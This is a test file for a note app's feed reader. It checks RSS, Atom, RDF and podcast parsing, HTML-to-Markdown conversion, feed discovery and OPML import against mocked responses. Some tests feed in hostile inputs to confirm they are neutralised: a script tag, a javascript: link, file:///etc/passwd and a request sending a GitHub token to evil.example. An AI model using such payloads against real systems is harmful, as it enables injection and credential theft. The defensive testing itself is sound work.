import { afterAll, beforeAll, describe, expect, test } from "bun:test";
import { readFileSync } from "node:fs";
import type { Route } from "playwright";
import { type App, engine, noErrors, openApp } from "./app";
import { answerPictures } from "./files";

/*
 * Feeds as lines reads them, in the browser's own XML and HTML parsers: trimmed copies of real
 * feeds (feeds/), mended ones, their HTML as Markdown, and finding a feed from a site or Apple
 * Podcasts. Nothing here reaches the network: every request is answered by the test.
 */

const fixture = (name: string) => readFileSync(new URL(`./feeds/${name}`, import.meta.url), "utf8");

let app: App;
beforeAll(async () => {
  app = await openApp();
});
afterAll(async () => {
  noErrors(app);
  await app.close();
});

const read = (text: string, url: string) => app.page.evaluate(([text, url]) => window.testing.reading.readFeed(text, url), [text, url] as const);
const markdown = (html: string, base?: string) => app.page.evaluate(([html, base]) => window.testing.reading.htmlToMarkdown(html, base), [html, base] as const);
const iso = (time?: number) => (time === undefined ? undefined : new Date(time).toISOString());

describe("reading feeds", () => {
  test("RSS 2.0: a blog's posts, their HTML, authors and dates", async () => {
    const feed = await read(fixture("blog.rss"), "https://svelte.dev/blog/rss.xml");
    expect([feed.title, feed.link, feed.description, feed.image]).toEqual([
      "Svelte blog",
      "https://svelte.dev/blog",
      "News and information about the magical disappearing UI framework",
      "https://svelte.dev/favicon.png",
    ]);
    const [first, second] = feed.posts;
    expect([first.id, first.title, first.link, first.author, iso(first.date)]).toEqual([
      "https://svelte.dev/blog/whats-new-in-svelte-october-2026",
      "What’s new in Svelte: October 2026",
      "https://svelte.dev/blog/whats-new-in-svelte-october-2026",
      "Dani Sandoval",
      "2026-10-31T00:00:00.000Z",
    ]);
    expect(first.excerpt).toStartWith("SvelteKit 3 is here! Check out the announcement post for the highlights");
    expect(await markdown(first.html, first.base)).toBe(
      [
        "SvelteKit 3 is here! Check out the [announcement post](https://svelte.dev/blog/sveltekit-3-is-here) for the highlights, then run [`sv migrate`](https://svelte.dev/docs/cli/sv-migrate) to handle most of the upgrade for you.",
        "## What’s new in SvelteKit 3",
        "- Adapters now receive the Svelte config as a function argument (**3.0.0-next.27**, [\\#16986](https://github.com/sveltejs/kit/pull/16986))\n- Adapters can override `getRequest` during `vite dev`",
      ].join("\n\n"),
    );
    expect(await markdown(second.html, second.base)).toBe("Today we’re releasing SvelteKit 3. *Upgrading* takes one command:\n\n```\nnpx sv migrate sveltekit-3\n```");
    expect(feed.posts.some((post) => post.audio)).toBe(false);
  });

  test("Atom: entries' links, xml:base, and text, HTML and XHTML content", async () => {
    const feed = await read(fixture("blog.atom"), "https://daringfireball.net/feeds/main");
    expect([feed.title, feed.link, feed.description]).toEqual(["Daring Fireball", "https://daringfireball.net/", "By John Gruber"]);
    const [first, second] = feed.posts;
    expect([first.id, first.link, first.author, iso(first.date)]).toEqual([
      "tag:daringfireball.net,2026:/linked//6.43724",
      "https://techcrunch.com/2026/11/12/jensen-huang-agrees-to-testify-before-congress/",
      "John Gruber",
      "2026-11-12T21:32:07.000Z",
    ]);
    const text = await markdown(first.html, first.base);
    expect(text).toContain("> Ex-Nvidia CEO Jensen Huang has agreed to testify before Congress, House Foreign Affairs");
    // Relative to the content's xml:base.
    expect(text).toEndWith("Closed-door is pantomime. [Public reckonings will come next year](https://daringfireball.net/linked/2026/11/11/huang).");
    // A title written as HTML reads as text; the date it was updated stands in for one it was published.
    expect([second.title, iso(second.date), second.excerpt]).toEqual(["Apple’s Year in Review", "2026-11-10T18:00:00.000Z", "A look back at the year, in brief & with feeling."]);
    expect(await markdown(second.html, second.base)).toBe("It was a **good** year.");
  });

  test("a podcast: artwork, episodes' sound, durations, seasons and numbers", async () => {
    const feed = await read(fixture("podcast.rss"), "https://feeds.megaphone.fm/FSI1483080183");
    expect([feed.title, feed.author, feed.image]).toEqual([
      "Syntax - Tasty Web Development Treats",
      "Wes Bos & Scott Tolinski - Full Stack JavaScript Web Developers",
      "https://megaphone.imgix.net/podcasts/5197fe5a/image/artwork.png?ixlib=rails-4.3.1&max-w=3000",
    ]);
    const [first, second] = feed.posts;
    expect(first).toMatchObject({
      id: "14678690-dd33-11f1-b943-2b9148b63cb2",
      link: "https://syntax.fm/1055",
      author: "Wes Bos & Scott Tolinski",
      image: "https://megaphone.imgix.net/podcasts/14678690/image/episode.png",
      audio: { url: "https://traffic.megaphone.fm/FSI3647670844.mp3", type: "audio/mpeg" },
      duration: 1882,
      season: 9,
      episode: 1055,
    });
    // The show notes, from content:encoded; the excerpt from the plain description.
    expect(await markdown(first.html, first.base)).toContain("- **[00:00](https://syntax.fm/1055#t=00:00)** Welcome to Syntax!");
    expect(first.excerpt).toBe("Scott and Wes sit down with GitHub’s Kyle Daigle to ask what the hell is going on with GitHub. Show Notes 00:00 Welcome to Syntax!");
    // No link, and its guid isn't one; Podcasting 2.0's season and episode.
    expect(second).toMatchObject({ id: "a2b9c0f2-dd33-11f1", duration: 2710, season: 9, episode: 1054 });
    expect(second.link).toBeUndefined();
  });

  test("RSS 1.0 (RDF): items beside the channel, their ids, Dublin Core's authors and dates", async () => {
    const feed = await read(fixture("slashdot.rdf"), "https://rss.slashdot.org/Slashdot/slashdotMain");
    expect([feed.title, feed.link, feed.author, feed.image]).toEqual(["Slashdot", "https://slashdot.org/", undefined, "https://a.fsdn.com/sd/topics/topicslashdot.gif"]);
    const [first, second] = feed.posts;
    expect([first.id, first.author, iso(first.date)]).toEqual([
      "https://tech.slashdot.org/story/26/11/13/0135237/whoop-launches-a-social-network?utm_source=rss1.0mainlinkanon&utm_medium=feed",
      "BeauHD",
      "2026-11-13T01:40:00.000Z",
    ]);
    // The embedded discussion is a link; the tracking pixel goes.
    expect(await markdown(first.html, first.base)).toBe(
      [
        "Whoop has launched Humans, a social network built into its fitness app.",
        "[Read more of this story](https://tech.slashdot.org/story/26/11/13/0135237/?utm_source=rss1.0moreanon&utm_medium=feed) at Slashdot.",
        "[slashdot.org](https://slashdot.org/slashdot-it.pl?op=discuss&id=24150406&smallembed=1)",
      ].join("\n\n"),
    );
    expect(second.excerpt).toBe("Astronomers re-analyzed the data — and the ring is still there.");
  });

  test("a broken feed is mended: whitespace first, bare &s, HTML's entities, a prefix never declared", async () => {
    const feed = await read(fixture("broken.rss"), "https://tomandjerry.example/feed");
    expect([feed.title, feed.link, feed.description, feed.image]).toEqual([
      "Tom & Jerry’s Blog",
      "https://tomandjerry.example/?a=1&b=2",
      "Cartoons and chases",
      "https://tomandjerry.example/art.png",
    ]);
    const [first, second] = feed.posts;
    expect([first.title, first.link, iso(first.date), first.duration, first.html]).toEqual([
      "Cheese — a history",
      "https://tomandjerry.example/cheese?ref=feed&utm=1",
      "2026-11-10T13:00:00.000Z",
      750,
      "<p>Holes & all. <b>Swiss</b> first.</p>",
    ]);
    expect(second.title).toBe("Mousetraps © 2026");
    // Plain text keeps its lines and paragraphs.
    expect(await markdown(second.html, second.base)).toBe("Plain text,\ntwo lines.\n\nAnd a second paragraph &unknownentity; here.");
  });

  test("characters XML doesn't allow are left out, and a feed cut short keeps what came before", async () => {
    const control = await read(`<rss><channel><title>Bell\u0007s</title><item><title>One\u000b</title><guid>1</guid></item></channel></rss>`, "https://example.com/feed");
    expect([control.title, control.posts.map((post) => post.title)]).toEqual(["Bells", ["One"]]);
    const cut = await read(`<rss><channel><title>Cut</title><item><title>One</title><guid>1</guid></item><item><title>Two</title><guid>2</guid></item><item><title>Thr`, "https://example.com/feed");
    expect(cut.posts.map((post) => post.title).slice(0, 2)).toEqual(["One", "Two"]);
  });

  test("where a post is talked about: RSS's <comments>, Atom's replies page (not its comments' feed)", async () => {
    const rss = await read(
      `<rss version="2.0"><channel><title>News</title><link>https://news.example/</link><item><title>A</title><link>https://a.example/post</link><comments>https://news.example/item?id=1</comments></item><item><title>B</title><link>https://b.example/</link></item></channel></rss>`,
      "https://news.example/rss",
    );
    expect(rss.posts.map((post) => post.comments)).toEqual(["https://news.example/item?id=1", undefined]);
    // One that says only "Comments", a link to them, has no excerpt to show in the list.
    const news = await read(
      `<rss version="2.0"><channel><title>News</title><item><title>A</title><link>https://a.example/post</link><comments>https://news.example/item?id=1</comments><description><![CDATA[<a href="https://news.example/item?id=1">Comments</a>]]></description></item><item><title>B</title><link>https://b.example/</link><description>What B is about.</description></item></channel></rss>`,
      "https://news.example/rss",
    );
    expect(news.posts.map((post) => post.excerpt)).toEqual(["", "What B is about."]);
    const atom = await read(
      `<feed xmlns="http://www.w3.org/2005/Atom"><title>Blog</title><entry><title>A</title><id>a</id><link href="/a"/><link rel="replies" type="application/atom+xml" href="/a/comments.xml"/><link rel="replies" type="text/html" href="/a#comments"/></entry><entry><title>B</title><id>b</id><link rel="replies" type="application/atom+xml" href="/b/comments.xml"/></entry></feed>`,
      "https://blog.example/feed",
    );
    expect(atom.posts.map((post) => post.comments)).toEqual(["https://blog.example/a#comments", undefined]);
  });

  test("a page isn't a feed", async () => {
    const refused = await app.page.evaluate(() => {
      try {
        window.testing.reading.readFeed("<!doctype html><html><body>Hi</body></html>", "https://example.com/");
        return false;
      } catch (error) {
        return error instanceof window.testing.reading.NotAFeed;
      }
    });
    expect(refused).toBe(true);
  });
});

describe("HTML as Markdown", () => {
  test("keeps what lines draws, escapes what it would read as its own, and drops the rest", async () => {
    const html = `
      <h1>Title</h1>
      <p>A #tag, @someone, $x$, ==this==, *stars*, [brackets] and a_snake_case word, at <b>no</b> cost: $5.</p>
      <p># Not a heading<br>- not a list<br>1. nor this</p>
      <ul><li>One<ul><li>Nested</li></ul></li><li>Two</li></ul>
      <ol start="3"><li>Third</li><li>Fourth</li></ol>
      <blockquote><p>Quoted</p><p>twice</p></blockquote>
      <table><tr><th>Name</th><th>Size</th></tr><tr><td>a|b</td><td>2</td></tr></table>
      <p><img src="/cat.png" alt="A cat"><img src="data:image/png;base64,AAAA"><img src="https://track.example/p.gif" width="1" height="1"></p>
      <p><a href="javascript:alert(1)">Not a link</a> <a href="mailto:a@b.example">Mail</a> <a href="page two.html">Spaced</a></p>
      <script>alert(1)</script><style>p{}</style><!-- a comment -->
      <p>Some <code>code with \`ticks\`</code> and <del>gone</del> <em> spaced </em>.</p>`;
    expect(await markdown(html, "https://example.com/post/")).toBe(
      [
        "## Title",
        "A \\#tag, \\@someone, \\$x\\$, \\=\\=this\\=\\=, \\*stars\\*, \\[brackets] and a_snake_case word, at **no** cost: \\$5.",
        "\\# Not a heading\n\\- not a list\n1\\. nor this",
        "- One\n  - Nested\n- Two",
        "3. Third\n4. Fourth",
        "> Quoted\n>\n> twice",
        "| Name | Size |\n| --- | --- |\n| a\\|b | 2 |",
        "![A cat](https://example.com/cat.png)",
        "Not a link [Mail](mailto:a@b.example) [Spaced](https://example.com/post/page%20two.html)",
        "Some `` code with `ticks` `` and ~~gone~~ *spaced* .",
      ].join("\n\n"),
    );
  });

  test("a post that says nothing but links to itself or its comments says nothing of its own", async () => {
    const saysMore = (html: string, own: string[]) => app.page.evaluate(([html, own]) => window.testing.reading.saysMore(html, "https://news.example/", own), [html, own] as const);
    const own = ["https://a.example/post", "https://news.example/item?id=1"];
    expect(await saysMore(`<a href="https://news.example/item?id=1">Comments</a>`, own)).toBe(false);
    expect(await saysMore(`<p><a href="item?id=1">Comments</a> <a href="https://a.example/post">Link</a></p>`, own)).toBe(false);
    expect(await saysMore("", own)).toBe(false);
    expect(await saysMore(`<p>What it found.</p><a href="https://news.example/item?id=1">Comments</a>`, own)).toBe(true);
    expect(await saysMore(`<a href="https://elsewhere.example/">Elsewhere</a>`, own)).toBe(true);
    expect(await saysMore(`<img src="chart.png">`, own)).toBe(true);
  });

  test("a block within a line stays in it: code as code, anything else as its words", async () => {
    const html = `
      <div>Read this<i><pre>[Open](file:///System/Applications/Calculator.app)\n@[Secret] #tag $x$ [[New note]]</pre></i> now.</div>
      <div>x <a><pre>[click](file:///etc/passwd)</pre></a> y <b><pre>---\n# Heading</pre></b></div>
      <div>Intro <span><h2>## Two</h2><ul><li>- item</li></ul><blockquote>&gt; quote</blockquote></span> end</div>`;
    expect(await markdown(html)).toBe(
      [
        "Read this *`[Open](file:///System/Applications/Calculator.app) @[Secret] #tag $x$ [[New note]]`* now.",
        "x `[click](file:///etc/passwd)` y **`--- # Heading`**",
        "Intro \\## Two \\- item \\> quote end",
      ].join("\n\n"),
    );
  });

  test("code is shown without its language, so nothing draws or runs it", async () => {
    const html = `<pre class="language-http">GET https://evil.example/collect?k={{github}}</pre><pre><code class="language-mermaid">graph TD; A--&gt;B</code></pre><pre>\`\`\`js\nnested\n\`\`\`</pre>`;
    expect(await markdown(html)).toBe(["```\nGET https://evil.example/collect?k={{github}}\n```", "```\ngraph TD; A-->B\n```", "````\n```js\nnested\n```\n````"].join("\n\n"));
  });
});

describe("subscribing", () => {
  const subscribe = (input: string) =>
    app.page.evaluate(async (input) => {
      const { feeds, reading, notes } = window.testing;
      try {
        const url = await feeds.subscribe(input);
        const subscription = feeds.subscription(url)!;
        return { url, title: subscription.title, note: notes.get(subscription.note)!.note.body.split("\n# ")[0] };
      } catch (error) {
        return { error: error instanceof reading.NoFeed ? "no feed" : (error as Error).message };
      }
    }, input);
  /** Answers requests for `href` as a site that lets web pages read it. */
  const answer = (href: string, body: string, type: string) =>
    app.page.route(
      (url) => url.href === href,
      (route: Route) => route.fulfill({ body, contentType: type, headers: { "access-control-allow-origin": "*" } }),
    );

  test("to the feed's link, a site's, or a podcast's on Apple Podcasts: a note of the feed's, made as the Library makes one", async () => {
    await answerPictures(app.page);
    await answer("https://site.example/", `<!doctype html><head><link rel="alternate" type="application/atom+xml" href="/atom.xml"><link rel="alternate" type="application/rss+xml" href="feed.xml"></head>`, "text/html");
    await answer("https://site.example/feed.xml", fixture("blog.rss"), "application/rss+xml");
    await app.page.route(
      (url) => url.href.startsWith("https://itunes.apple.com/lookup?id=1253186678"),
      (route) => route.fulfill({ json: { resultCount: 1, results: [{ kind: "podcast", collectionName: "Syntax", artistName: "Wes Bos", feedUrl: "https://feeds.megaphone.fm/FSI1483080183" }] }, headers: { "access-control-allow-origin": "*" } }),
    );
    await answer("https://feeds.megaphone.fm/FSI1483080183", fixture("podcast.rss"), "application/xml");
    const blog = await subscribe("https://site.example/feed.xml");
    expect([blog.url, blog.title]).toEqual(["https://site.example/feed.xml", "Svelte blog"]);
    // Its artwork kept as an attachment, as the Library keeps covers.
    expect(blog.note).toMatch(/^---\ntype: feed\nfeed: https:\/\/site\.example\/feed\.xml\nlink: https:\/\/svelte\.dev\/blog\n---$/);
    // RSS first, of the feeds the page names; one already subscribed to isn't again.
    expect(await subscribe("site.example")).toEqual(blog);
    const podcast = await subscribe("https://podcasts.apple.com/us/podcast/syntax-tasty-web-development-treats/id1253186678");
    expect([podcast.url, podcast.title]).toEqual(["https://feeds.megaphone.fm/FSI1483080183", "Syntax - Tasty Web Development Treats"]);
    expect(podcast.note).toContain("type: podcast\nauthor: Wes Bos & Scott Tolinski - Full Stack JavaScript Web Developers\nfeed: https://feeds.megaphone.fm/FSI1483080183");
    const bodies = await app.page.evaluate(() => window.testing.notes.entries.map(({ note }) => note.body));
    // (WebKit here can't store pictures, so has none, rather than one shown from the site.)
    if (engine() === "chromium") expect(bodies.filter((body) => /!\[[^\]]*\]\(\.\.\/attachments\/[0-9a-f]{32}\.\w+\)/.test(body))).toHaveLength(2);
  });

  test("a site's page that names no feed: where sites usually keep theirs, beside the page first, one request at a time, giving up on a site that asks to be left alone", async () => {
    const asked: string[] = [];
    /** Every request to `host` noted, and answered 404 unless answered otherwise below (routes added later are asked first). */
    const site = (host: string) =>
      app.page.route(
        (url) => url.hostname === host,
        (route) => {
          asked.push(route.request().url());
          return route.fulfill({ status: 404, body: "", headers: { "access-control-allow-origin": "*" } });
        },
      );
    await site("quiet.example");
    await site("busy.example");
    await answer("https://quiet.example/blog", "<!doctype html><title>Blog</title>", "text/html");
    await answer("https://quiet.example/blog/rss.xml", fixture("blog.atom"), "application/atom+xml");
    await answer("https://busy.example/news", "<!doctype html><title>News</title>", "text/html");
    await app.page.route("https://busy.example/news/rss", (route) => {
      asked.push(route.request().url());
      return route.fulfill({ status: 429, body: "", headers: { "access-control-allow-origin": "*", "retry-after": "60" } });
    });

    const blog = await subscribe("quiet.example/blog");
    expect(blog.url).toBe("https://quiet.example/blog/rss.xml");
    expect(asked).toEqual(["https://quiet.example/blog/feed", "https://quiet.example/blog/rss"]);
    asked.length = 0;
    expect(await subscribe("https://busy.example/news")).toEqual({ error: "no feed" });
    expect(asked).toEqual(["https://busy.example/news/feed", "https://busy.example/news/rss"]);
    app.errors.length = 0;
  });

  test("a podcast's site, whose own feed is for its posts: the podcast it links to, by its feed or its page on Apple Podcasts, but not one it only mentions", async () => {
    for (const host of ["www.syntax.fm", "syntax.fm", "mentions.example", "feeds.host.example"])
      await app.page.route((url) => url.hostname === host, (route) => route.fulfill({ status: 404, body: "", headers: { "access-control-allow-origin": "*" } }));
    await app.page.route(
      (url) => url.href.startsWith("https://itunes.apple.com/lookup?id=1253186678"),
      (route) => route.fulfill({ json: { resultCount: 1, results: [{ kind: "podcast", collectionName: "Syntax", feedUrl: "https://feeds.megaphone.fm/FSI1483080183" }] }, headers: { "access-control-allow-origin": "*" } }),
    );
    await answer("https://feeds.megaphone.fm/FSI1483080183", fixture("podcast.rss"), "application/xml");
    // The podcast's feed says its site is https://syntax.fm.
    await answer("https://feeds.host.example/syntax.rss", fixture("podcast.rss"), "application/xml");
    const page = (feed: string, link: string) => `<!doctype html><head><link rel="alternate" type="application/atom+xml" href="${feed}"></head><body><a href="${link}">Listen</a></body>`;
    await answer("https://www.syntax.fm/", page("/posts.atom", "https://feeds.host.example/syntax.rss"), "text/html");
    await answer("https://www.syntax.fm/posts.atom", fixture("blog.atom"), "application/atom+xml");
    await answer("https://syntax.fm/listen", `<!doctype html><a href="https://example.com/">Elsewhere</a> <a href="https://podcasts.apple.com/us/podcast/syntax/id1253186678">Apple Podcasts</a>`, "text/html");
    await answer("https://mentions.example/", page("/feed.xml", "https://feeds.host.example/syntax.rss"), "text/html");
    await answer("https://mentions.example/feed.xml", fixture("blog.rss"), "application/rss+xml");

    expect((await subscribe("https://www.syntax.fm/")).url).toBe("https://feeds.host.example/syntax.rss");
    expect((await subscribe("https://syntax.fm/listen")).url).toBe("https://feeds.megaphone.fm/FSI1483080183");
    // A blog that links to someone else's podcast is subscribed to for its own posts.
    expect((await subscribe("https://mentions.example/")).url).toBe("https://mentions.example/feed.xml");
    app.errors.length = 0;
  });

  test("says when there's none, and when the site doesn't let web pages read it", async () => {
    // Where sites usually keep a feed isn't there either.
    await app.page.route((url) => url.hostname === "nofeed.example", (route) => route.fulfill({ status: 404, body: "", headers: { "access-control-allow-origin": "*" } }));
    await answer("https://nofeed.example/", "<!doctype html><title>Nothing</title>", "text/html");
    // A page sees a site that doesn't let it read it as one it couldn't reach (Playwright lets every answer of its own through).
    await app.page.route("https://closed.example/feed", (route) => route.abort("failed"));
    expect(await subscribe("https://nofeed.example/")).toEqual({ error: "no feed" });
    expect(await subscribe("not a link at all")).toEqual({ error: "no feed" });
    expect(await subscribe("https://closed.example/feed")).toEqual({ error: "blocked" });
    // Which the browser says in the console.
    app.errors.length = 0;
  });
});

test("reads the feeds an OPML file lists, in folders or not", async () => {
  const opml = `<?xml version="1.0"?><opml version="1.0"><head><title>Feeds</title></head><body>
    <outline text="Blogs"><outline type="rss" text="Svelte" xmlUrl="https://svelte.dev/blog/rss.xml" htmlUrl="https://svelte.dev/blog"/></outline>
    <outline type="rss" title="Syntax" text="ignored" xmlUrl="https://feeds.megaphone.fm/FSI1483080183"/>
    <outline type="rss" text="Again" xmlUrl="https://svelte.dev/blog/rss.xml"/>
    <outline type="link" text="Not a feed" url="https://example.com/"/>
  </body></opml>`;
  expect(await app.page.evaluate((opml) => window.testing.reading.readOpml(opml), opml)).toEqual([
    { url: "https://svelte.dev/blog/rss.xml", title: "Svelte", site: "https://svelte.dev/blog" },
    { url: "https://feeds.megaphone.fm/FSI1483080183", title: "Syntax" },
  ]);
});
